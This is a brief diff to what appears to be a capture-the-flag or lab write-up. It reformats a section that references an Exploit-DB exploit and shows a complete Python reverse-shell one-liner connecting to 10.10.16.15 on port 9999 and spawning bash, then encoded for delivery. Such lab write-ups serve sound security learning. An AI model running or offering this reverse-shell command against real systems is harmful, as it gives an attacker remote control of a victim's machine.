@@ -41,17 +41,16 @@ Exploit: https://www.exploit-db.com/exploits/47837
 
 Nice, time for a reverse shell. 
 
-- Payload
+## Payload
 
 python3
 ```
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.15",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
 ```
-```
-Then base64 encoded,
-then urlencoded (all charaters)
 
-```
+- Then base64 encoded
+- Then urlencoded (all charaters)
+
 
 - Final payload
 ```
